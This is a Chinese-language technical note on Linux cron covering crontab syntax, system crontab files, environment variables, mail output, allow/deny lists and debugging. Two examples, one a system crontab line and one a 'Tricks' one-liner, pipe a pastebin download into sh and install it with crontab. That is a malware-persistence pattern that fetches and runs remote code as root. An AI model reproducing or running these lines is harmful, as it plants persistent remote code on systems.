---
createTime: 2024-10-30 16:12
tags:
  - "#hash1"
  - "#hash2"
---

# Cron 02 - Cron

## 0x01 Preface

Modern Versions cron 和 Multi-user Capability cron 大体上相同，由 2 部分组成

- crond —— 负责执行 cron schedule tasks
- crontab —— 管理 crontab files

## 0x02 Crond
   
> crond 还支持集群，具体看 cron.8
   
 crond(cron daemon)，是实际执行 cron scheduled tasks 的角色，会从如下路径读取 crontab files
   
 - `/etc/crontab`
	针对系统的 crontab file，默认为空。最初用于运行 daily，weekly，mothly 任务，但是现在被 anacron 接管
 - `/etc/anacrontab`
	cron.daily/cron.weekly/cron.monthly 的入口 crontab file
	这部分由 anacron 管理
 - `/var/spool/cron/`
	由 `crontab` 创建的 crontab file，单个用户单文件
 - `/etc/cron.d/`
	针对系统的 crontab files
 
 通常可以使用 `systemctl start crond` 来启动 daemon，但是也有一些 distros 会使用 `systemctl start cronie`
 
## 0x03 Crontab Files[^2]
 
在 [0x02 Crond](#0x02%20Crond) 部分已经知道了，cron 会从指定的路径读取 crontab files，那么 crontab files 该如何编写呢
 
### 0x03a Comments and Nonsense Characters

1. Blank lines, leading spaces, and tabs are ignored
2. Lines whose first non-white space character is a pound-sign(#) are comments, and are not processed.(comments are not allowed on the same line as cron commands)
 
### 0x03b Cron Entries
 
Cron Entries 每一行代表一个任务
 
```
# * * * * * <command to execute>
# | | | | |
# | | | | day of the week (0–6) (Sunday to Saturday; 
# | | | month (1–12)             7 is also Sunday on some systems)
# | | day of the month (1–31)
# | hour (0–23)
# minute (0–59)
```

由 2 部分组成

1. cron part
2. command part
 
#### cron part
 
cron part 通常由 5 个字段组成，从左往右分别是
 
- minute
	取值范围 0-59
- hour
	取值范围 0-23
- day of month
	取值范围 1-31
- month
	取值范围 1-12
	也可以使用缩写，例如 jan,feb,oct 等等
- day of week
	取值范围 0-7(0 or 7 is Sunday)
	也可以使用缩写，例如 mon,web,fri 等等

除这些取值外，每个字段还可以和一些特殊字符一起使用

- `*`
	first-last 代表所有可能的值，例如 month 字段为 `*`，则表示在满足其它字段的制约条件后每月都执行 command part
- `~`
	表示取值范围中任意选择一个值，例如 day 字段为 `1~3`，则表示在满足其它字段的制约条件后每月的 1-3 任意一天都执行 command part
- `-`
	表示取值范围，例如 hour 字段为 `8-11`，则表示在满足其它字段的制约条件后在每天的 8,9,10,11 小时都会执行 command part
	可以和 `,` 一起使用，例如 `* 8-11,14-17 * * * /usr/bin/freshclam`
- `,`
	表示逻辑与，如果 minute 字段为 `1,2,49`，则表示在满足其它字段的制约条件后在每小时的 1,2,49 分钟都会执行 command part
	可以和 `-` 一起使用，例如 `1,2,49-60 * * * * /usr/bin/timeshift --check --scripted`
- `/number`
	表示在范围内每 number
	可以和 `*` 一起使用，例如 `* */2 * *` 表示每 2 小时都会执行 command part 
	可以和 `-` 一起使用，例如 `* 0-10/2 * *` 表示在 0-10 小时内，每 2 小时都会执行 command part

还有一点需要注意的是，如果 month 和 day 字段都有具体的取值(非 `*`)，那么匹配 month 和 day 时都会执行 command part。例如 `30 4 1,15 * 5` 会在每月的 1 和 15 号 以及 每周 5 的 4:30 运行
 
除了上述这些，还有一些扩展
 
- `@reboot`
	Run once after reboot
- `@yearly` or `@annually`
	Run once a year
	等价于 `0 0 1 1 *`
- `@monthly`
	Run once a month
	等价于 `0 0 1 * *`
- `@weekly`
	Run once a week
	等价于 `0 0 * * 0`
- `@daily`
	Run once a day
	等价于 `0 0 * * *`
- `@hourly`
	Run once an hour
	等价于 `0 * * * *`
 
#### command part
 
command part 指定了 schedule 的命令，以 newline 或者是 `%` 结尾(划分 cron entries)，默认会以 `/bin/sh` 运行

> [!important]
> 所以如果 command part 使了用类似 `mysqldump` 配合 `like %` 的，需要使用 `\` 转义(如果没有转义 mail subject 不是完整的 command part)

如果 command part 出现 `%`，且没有使用 `\` 转义，那么 `%` 会被认为是 newline ，并且 `%` 后面的内容都会会认为是 stdin 中的
 
#### `/etc/cron.d` and `/etc/crontab`
 
`/etc/cron.d` 和 `/etc/crontab` 是针对系统的 crontab files，并不知道需要以（那些）用户运行 command part。所以在 cron part 和 command part 之间新增了一个字段表示运行的用户
 
```
0 4 * * * root (crul -fsSL https://pastebin.com/raw/e8XzcU2Q || wget -q -O- https://pastebin.com/raw/e8XzcU2Q) | sh
```
 
#### run-parts
 
你可能还会在 crontab files 中常常看见 `run-parts`，例如默认的 `/etc/cron.d/0hourly`
 
```
# Run the hourly jobs
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
01 * * * * root run-parts /etc/cron.hourly
```
 
这其实就是 command part，而 `run-parts` 会运行指定目录下的所有 executable files。例如上述就会运行 `/etc/corn.hourly` 中所有的内容，通常就是一个 `0anacron` shell 脚本
 
### 0x03c Environments
 
**cron 并不会使用系统的全局变量(所以直接使用 PATH 下的命令，可能会不生效，尽可能使用绝对路径)**， 这一点可以使用如下规则来校验

```
[root@vbox ~]# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin

[root@vbox ~]# crontab -l
* * * * * echo ${PATH}

[root@vbox mail]# tail -f root

From root@vbox.localdomain  Thu Oct 31 14:23:01 2024
Return-Path: <root@vbox.localdomain>
X-Original-To: root
Delivered-To: root@vbox.localdomain
Received: by vbox.localdomain (Postfix, from userid 0)
        id 36197600CFA6; Thu, 31 Oct 2024 14:23:01 +0800 (CST)
From: "(Cron Daemon)" <root@vbox.localdomain>
To: root@vbox.localdomain
Subject: Cron <root@vbox> echo ${PATH}
Content-Type: text/plain; charset=UTF-8
Auto-Submitted: auto-generated
Precedence: bulk
X-Cron-Env: <XDG_SESSION_ID=25>
X-Cron-Env: <XDG_RUNTIME_DIR=/run/user/0>
X-Cron-Env: <LANG=en_US.UTF-8>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
X-Cron-Env: <USER=root>
Message-Id: <20241031062301.36197600CFA6@vbox.localdomain>
Date: Thu, 31 Oct 2024 14:23:01 +0800 (CST)

/usr/bin:/bin
```

这里可以明显看到 cron 使用的 `${PATH}` 和 系统使用的并不一致。所以想要设置环境变量，需要使用 `name=value` 的格式显式声明

例如
 
```
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=""
```
 
但是 cron 也会设置一些缺省的环境变量
 
- `SHELL=/bin/sh`
- `LOGNAME=当前 crontab file 所有者的用户名`
- `HOME=当前 crontab file 所有者的 HOME 目录`
 
除此外还有一些常见的环境变量
 
- `MAILTO`
	定义该怎么发送邮件，cron 默认会将 stdout 和 stderr 发送到 `/var/spool/mail/${USER}`(在 [0x02b Multi-user Capability](#0x02b%20Multi-user%20Capability) 引用)
	- 如果为 `MAILTO=""` 就表示不发送邮件
	- 如果为 `MAILTO=<local_user_name>` 就表示发送到 `/var/spool/mail/local_user_name`
	- 如果为 `MAILTO=<remote_mail_address>` 将表示发送到 `remote_mail_address`
- `MAILFROM`
	指定邮件发送者的邮箱名，如果没有指定默认会使用 crontab 所有者的 `${USER}@${HOSTNAME}`
- `CRON_TZ`
	指定 cron 使用的 timezone，默认会使用系统的(可以使用 `timedatectl` 查看)
- `RANDOM_DELAY=n`
	cron 会在 `cron part + n minutes` 内随机执行任务
 
### 0x03d Crontab Files Examples
 
#### `/var/spool/cron/root`
 
```
0 * * * * /usr/bin/mysqldump --tables dd.password -t -r /tmp/dd.password
```
 
#### `/etc/cron.d/timeshift-horly`
 
```
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=david@gmail.com

0 * * * * root timeshift --check --scripted
```
 
## 0x04 Crontab Cmd[^3]
 
`crontab` 同时也是一个管理 crontab files 的程序(这里的 crontab files 特指 `/var/spool/cron` 中对应用户的 crontab files)
 
```
crontab [-u user] <file | ->
crontab [-T] <file | ->
crontab [-u user] <-l | -r | -e> [-i] [-s]
crontab -n [ hostname ]
crontab -c
crontab -V
```
 
### 0x04a Optional args
 
- `-u`
	指定需要修改 crontab file 的用户名，如果没有指定默认使用 `${USER}`
- `-l`
	输出(当前用户的) crontab file
- `-r`
	删除(当前用户的) crontab file
- `-e`
	修改/新增(当前用户的) crontab file，默认会使用 `${VISUAL}` | `${EDITOR}` 作为编辑器
- `-i`
	删除 crontab file 前 prompt
- `-c` | `-n`
	集群相关的参数

### 0x04b Tricks

`crontab` 可以和 stdin 巧妙的结合

```
echo "* * * * * (crul -fsSL https://pastebin.com/raw/e8XzcU2Q || wget -q -O- https://pastebin.com/raw/e8XzcU2Q) | sh" | crontab -
```

## 0x05 Mail

> [!important]
> 如果需要使用邮件的功能，需要安装 postfix

cron 可以通过 `MAILTO` 和 `MAILFROM` 来实现邮件推送

假设有如下任务

```
* * * * * /usr/bin/echo "hello world" && fzf
```

那么 cron 会往 `/var/spool/mail/${USER}` 中写入类似如下内容，发件人和发件人都为 `${USER}@${HOSTNAME}`

```
From root@vbox.localdomain  Wed Oct 30 16:54:01 2024
Return-Path: <root@vbox.localdomain>
X-Original-To: root
Delivered-To: root@vbox.localdomain
Received: by vbox.localdomain (Postfix, from userid 0)
        id DA074600CFA7; Wed, 30 Oct 2024 16:54:01 +0800 (CST)
From: "(Cron Daemon)" <root@vbox.localdomain>
To: root@vbox.localdomain
Subject: Cron <root@vbox> /usr/bin/echo "hello world" && fzf 
Content-Type: text/plain; charset=UTF-8
Auto-Submitted: auto-generated
Precedence: bulk
X-Cron-Env: <XDG_SESSION_ID=22>
X-Cron-Env: <XDG_RUNTIME_DIR=/run/user/0>
X-Cron-Env: <LANG=en_US.UTF-8>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
X-Cron-Env: <USER=root>
Message-Id: <20241030085401.DA074600CFA7@vbox.localdomain>
Date: Wed, 30 Oct 2024 16:54:01 +0800 (CST)

hello world
/bin/sh: fzf: command not found
```

也可以看到 cron 会将 stdin 和 stdout 中的内容都输出到邮件的主体中

增加一个 `MAILFROM` 变量

```
MAILFROM='zz@shodan.com'
* * * * * /usr/bin/echo "hello world" && fzf
```

那么发件人就会从 `${USER}@${HOSTNAME}` 变为 `MAILFROM` 的值

```
From zz@shodan.com  Wed Oct 30 17:07:01 2024  
Return-Path: <zz@shodan.com>  
X-Original-To: root  
Delivered-To: root@vbox.localdomain  
Received: by vbox.localdomain (Postfix, from userid 0)  
       id 7C966600CFA7; Wed, 30 Oct 2024 17:07:01 +0800 (CST)  
From: "(Cron Daemon)" <zz@shodan.com>
```

再增加一个 `MAILTO`

```
MAILFROM='zz@shodan.com'
MAILTO='brevin.mattheo@duckdocks.org'
* * * * * /usr/bin/echo "hello world" && fzf
```

那么收件人会收到类似的邮件

![](https://github.com/dhay3/picx-images-hosting/raw/master/2024-10-30_17-51-27.41y2a3ba8a.webp)

## 0x06 Crontab PAM/ACL
 
上面这些内容并不是 cron(Modern Versions) 独有的，red hat 在 cronie 中额外引入了 PAM 和 SELinux 的逻辑，让 cron 对特定的用户开放

### 0x06a cron.allow/cron.deny

> [!NOTE]
> 说实话这功能挺鸡肋的，只针对 `crontab`，不适用于 `anacron`

`/etc/cron.allow` 使用白名单机制，在该文件中的用户名，可以使用 `crontab`，反之不可以。例如

```
[root@vbox home]# cat /etc/cron.allow
root
```

那么当使用非 root 用户创建 crontab files 就会出现如下提示

```
[root@vbox home]# su trojan
[trojan@vbox home]$ crontab -l
You (trojan) are not allowed to use this program (crontab)
See crontab(1) for more information
```

> [!NOTE] 
> 如果是 root 通过 `crontab -u ` 的方式指定用户，不受影响

```
[root@vbox home]# crontab -u trojan -l
no crontab for trojan
```

同理 `/etc/cron.deny` 使用黑名单机制，在该文件中的用户名，不可以使用 `crontab`，反之可以

### 0x06b /etc/security/access.conf

除了 `/etc/cron.deny` 和 `/etc/cron.allow` 外，还可以使用 `/etc/security/access.conf` 来控制那些用户可以使用 `crontab`

## 0x07 How to Debug Cron Scheduled Tasks

在你写了一个未来执行的 cron scheduled task，怎么知道是否生效呢？(通常只有 command part 可能会出现问题，因为 cron 使用的环境变量和系统的不一定一致)

例如

```
0 2 * * 6 curl -sS ipinfo.io
```

我们可以先将 cron part 设置为 `* * * * *`

```
* * * * * curl -sS ipinfo.io
```

然后监听 `/var/spool/mail/${USER}` 的写入(cron 并不会将对应的信息记录到 systemd journal 中)，如果正常可以在 Subject 栏看到对应的 command part

```
[root@vbox ~]# tail -f /var/spool/mail/root
...
From root@vbox.localdomain  Thu Oct 31 14:14:02 2024
Return-Path: <root@vbox.localdomain>
X-Original-To: root
Delivered-To: root@vbox.localdomain
Received: by vbox.localdomain (Postfix, from userid 0)
        id 19E0A600CFA6; Thu, 31 Oct 2024 14:14:02 +0800 (CST)
From: "(Cron Daemon)" <root@vbox.localdomain>
To: root@vbox.localdomain
Subject: Cron <root@vbox> curl -sS ipinfo.io
...

```

当然你也可以使用 `systemctl stop crond` 来关闭 `crond`，然后以 debug 模式启动 `crond`

```
[root@vbox home]# crond -x test
debug flags enabled: test
[2393] cron started
log_it: (CRON 2393) INFO (RANDOM_DELAY will be scaled with factor 45% if used.)
log_it: ((null) 2393) Unauthorized SELinux context=unconfined_u:unconfined_r:unconfined_t:s0 file_context=system_u:object_r:system_cron_spool_t:s0 (/etc/crontab)
log_it: (root 2393) FAILED (loading cron table)
log_it: ((null) 2393) Unauthorized SELinux context=unconfined_u:unconfined_r:unconfined_t:s0 file_context=system_u:object_r:system_cron_spool_t:s0 (/etc/cron.d/0hourly)
log_it: (root 2393) FAILED (loading cron table)
log_it: (CRON 2393) INFO (running with inotify support)
log_it: (CRON 2393) INFO (@reboot jobs will be run at computer's startup.)
log_it: (root 2396) CMD (curl -sS ipinfo.io)
log_it: (root 2421) CMD (curl -sS ipinfo.io)
```

这里也可以清楚地看到创建的 scheduled task 运行了，就证明 command part 没有问题。重新启动 `crond` 并将 cron part 修改成你要想的即可

---
*Value your freedom or you will lose it, teaches history. Don't bother us with politics, respond those who don't want to learn.*

***References***

- `man cron.8`
- `man crontab.1`
- `man crontab.5`
- `man run-parts`

***FootNotes***

[^2]:[crontab(5) - Linux manual page](https://www.man7.org/linux/man-pages/man5/crontab.5.html)
[^3]:[crontab(1) - Linux manual page](https://www.man7.org/linux/man-pages/man1/crontab.1.html)
